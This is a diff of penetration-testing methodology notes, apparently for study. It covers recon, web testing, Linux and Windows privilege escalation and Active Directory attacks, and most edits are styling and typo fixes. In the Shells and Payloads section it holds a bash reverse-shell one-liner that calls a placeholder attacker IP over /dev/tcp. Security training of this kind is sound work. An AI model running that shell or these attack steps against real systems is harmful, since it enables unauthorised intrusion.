@@ -1,15 +1,15 @@
 
-## Reconnaissance & Target Discovery
+## <span style="color:#8BE9FD">Reconnaissance & Target Discovery</span>
 
-## Identify target scope (IP ranges, domains, subnets)
+## <span style="color:#8BE9FD">Identify target scope (IP ranges, domains, subnets)</span>
 
-## Passive Recon
+## <span style="color:#8BE9FD">Passive Recon</span>
 
 **1. Gather public info (DNS, WHOIS, certificates, company structure)
 
 2. Search public data leaks (Google Dorks, GitHub, Pastebin, etc.)**
 
-## Active Recon
+## <span style="color:#8BE9FD">Active Recon</span>
 
 ```
 Discover all active hosts on the target network/IP range/subnet(s). Document all active hosts to Obsidian notes
@@ -23,7 +23,7 @@ Discover all active hosts on the target network/IP range/subnet(s). Document all
 **1.**
 
 ```
-For each active host, Scan ALLTCP / UDP ports. Document each open port for the respective host in Obsidian.
+For each active host, Scan ALL TCP / UDP ports. Document each open port for the respective host in Obsidian.
 ○ NMAP TCP port scanning
 ○ NMAP UDP port scanning
 ```
@@ -71,15 +71,15 @@ Check for write access over a share (SMB, FTP)
 
 **8. If webserver(s) exist, see Webserver Enumeration Methodology**
 
-# Initial Enumeration Methodology
+# <span style="color:#FF5555">Initial Enumeration Methodology</span>
 
 Tuesday, January 21, 2025 9:38 PM
 
-## Documentation and Reporting
+## <span style="color:#8BE9FD">Documentation and Reporting</span>
 
 **Follow the** Bruno Rocha Moura Method **for documenting findings**
 
-##### Passive Recon
+##### <span style="color:#FFB86C">Passive Recon</span>
 
 **1. Look at public DNS records for domains/subdomains to enumerate**  
 **Look at certificates and other public info for domains/subdomains to enumerate**  
@@ -89,7 +89,7 @@ Tuesday, January 21, 2025 9:38 PM
 2.
 ```
 
-##### Active Recon
+##### <span style="color:#FFB86C">Active Recon</span>
 
 **1. Add domain to /etc/hosts file (if applicable)**
 
@@ -163,7 +163,7 @@ Look for vulnerabilities in Web Server technologies being used
 **9. If the webserver is determined to be running NodeJS or MongoDB, look for NOSQL injection vulnerabilities**
 
 ```
-Look for web service versions on discovered pages (Jenkins, WP, blog platforms, etc). Use enumeration techniques depending onthe technology:
+Look for web service versions on discovered pages (Jenkins, WP, blog platforms, etc). Use enumeration techniques depending on the technology:
 ○ Look for CMS or app-specific files (wp-content, .git/, etc.)
 ○ WordPress Enumeration
 ○ Joomla Enumeration
@@ -203,15 +203,15 @@ Look for login pages to test default or weak credentials
 ```
 
 ```
-13.Test submitting data on EVERY user input fieldand looking at interaction with Burp Suite
+13.Test submitting data on EVERY user input field and looking at interaction with Burp Suite
 ```
 
-### Webserver Enumeration Methodology
+### <span style="color:#50FA7B">Webserver Enumeration Methodology</span>
 
 Friday, April 4, 2025 1:18 PM
 
 ```
-Test submitting data on EVERY user input fieldand looking at interaction with Burp Suite
+Test submitting data on EVERY user input field and looking at interaction with Burp Suite
 ○ Intercepting Web Requests
 ○ Test SQL Injection on login pages to try and bypass them
 ```
@@ -240,7 +240,7 @@ If the webserver appears to be populating data from a database, test for SQL Inj
 ```
 
 ```
-16.If Accounts, Pages, or other things on the webpage seem to sequential and accessible in a GET or POST request, check for IDORvulnerabilities.
+16.If Accounts, Pages, or other things on the webpage seem to sequential and accessible in a GET or POST request, check for IDOR vulnerabilities.
 ```
 
 ```
@@ -294,24 +294,24 @@ If the webserver has a web socket or API that is reachable, check if the POST/GE
 21.
 ```
 
-##### Shells and Payloads
+##### <span style="color:#FFB86C">Shells and Payloads</span>
 
 1. Linux Reverse Shells
 2. Windows Reverse Shells
 3. Web Reverse Shells  
     **Going from webshell to reverse shell on Linux:**  
-    ○ bash -c 'bash -i >& /dev/tcp/10.10.14.8/7777 0>&  
+    ○ bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/7777 0>&  
     ○ Make sure to URL encode the payload
 
 ```
 4.
 ```
 
-##### Documentation and Reporting
+##### <span style="color:#FFB86C">Documentation and Reporting</span>
 
 **Follow the** Bruno Rocha Moura Method **for documenting findings**
 
-## If Webserver Exists
+## <span style="color:#8BE9FD">If Webserver Exists</span>
 
 ```
 Check web configuration files and source code for vulnerabilities, hard coded credentials, etc.
@@ -347,7 +347,7 @@ Other possible locations:
 
 **1.**
 
-## Default Methodology
+## <span style="color:#8BE9FD">Default Methodology</span>
 
 ```
 Run Linux Priv Esc Automation Scripts. Save output to a file and transfer it to Kali Box to examine in a text editor.
@@ -399,7 +399,7 @@ BE ESPECIALLY ATTENTIVE TO OUT OF THE ORDINARY SERVICES
 
 **3.**
 
-# Linux Privilege Escalation Methodology
+# <span style="color:#FF5555">Linux Privilege Escalation Methodology</span>
 
 Tuesday, January 21, 2025 9:45 PM
 
@@ -490,14 +490,14 @@ Look for vulnerable application / service versions
 
 **Attempt to brute force root user with password file and sucrack**
 
-## Linux Container Privilege Escalation
+## <span style="color:#8BE9FD">Linux Container Privilege Escalation</span>
 
 **1. Linux Containers (LXC/LXD)
 
 2. Docker Privilege Escalation
 3. Kubernetes Privilege Escalation**
 
-## Documentation and Reporting
+## <span style="color:#8BE9FD">Documentation and Reporting</span>
 
 **Follow the** Bruno Rocha Moura Method **for documenting findings**
 
@@ -630,7 +630,7 @@ Vulnerable Services
 9.
 ```
 
-### Windows Privilege Escalation Methodology
+### <span style="color:#50FA7B">Windows Privilege Escalation Methodology</span>
 
 Tuesday, January 21, 2025 9:46 PM
 
@@ -732,7 +732,7 @@ Capture hashes with a Malicious LNK file or SCF file
 
 - Living Off The Land Binaries and Scripts (LOLBAS)
 
-###### Once we are Admin
+###### <span style="color:#FFB86C">Once we are Admin</span>
 
 ```
 Attempt to recover all of the user passwords or NTLM hashes on the system
@@ -747,7 +747,7 @@ Attempt to recover all of the user passwords or NTLM hashes on the system
 
 **BEFORE YOU DO ANYTHING MAKE SURE TO SYNC YOUR CLOCK WITH THE DOMAIN CONTROLLER**
 
-##### Initial (Uncredentialed) Enumeration
+##### <span style="color:#FFB86C">Initial (Uncredentialed) Enumeration</span>
 
 Host Identification
 
@@ -785,12 +785,12 @@ User Foothold
 2.
 ```
 
-##### Credentialed Enumeration / Exploitation
+##### <span style="color:#FFB86C">Credentialed Enumeration / Exploitation</span>
 
 Host Identification
 
 1. Run Bloodhound with discovered credentials **(mark anything we have controlled over as owned)**
-2. Use ldapdomaindumpto identify all domain joined computers
+2. Use ldapdomaindump to identify all domain joined computers
 3. Enumerate accessible shares on servers with NetExec, SMBMap, PowerView, or Snaffler
 
 User Identification  
@@ -850,7 +850,7 @@ Run chisel for windows on the Windows pivot host
 
 2. Check bloodhound for **CanRDP** , **CanPSRemote** , or **SQLAdmin** abilities to move laterally onto other machines.
 
-#### Active Directory Methodology
+#### <span style="color:#FFB86C">Active Directory Methodology</span>
 
 Friday, April 4, 2025 1:19 PM
 
@@ -921,7 +921,7 @@ Additional Auditing
 3. Run Group3r to uncover vulnerabilities in AD Group Policy
 4. Run ADRecon.ps1 to discover additional AD misconfigurations and vulnerabilities that we may have missed
 
-##### Attacking AD Trusts (Parent Domain)
+##### <span style="color:#FFB86C">Attacking AD Trusts (Parent Domain)</span>
 
 1. Discover any current domain trusts with other domains using Get-ADTrust, Get-DomainTrust (PowerView), or Bloodhound
 2. From a Windows or Linux machine with Domain Admin privileges, attempt an ExtraSIDs attack to create an Enterprise Admin user in the parent domain
@@ -929,7 +929,7 @@ Additional Auditing
 4. Child -> Parent Attacks -Windows
 5. Child -> Parent Attacks -Linux
 
-##### Attacking AD Trusts (Cross Forest)
+##### <span style="color:#FFB86C">Attacking AD Trusts (Cross Forest)</span>
 
 1. Discover any current domain trusts with other domains using Get-ADTrust, Get-DomainTrust (PowerView), or Bloodhound
 2. Attempt cross-forest kerberoasting
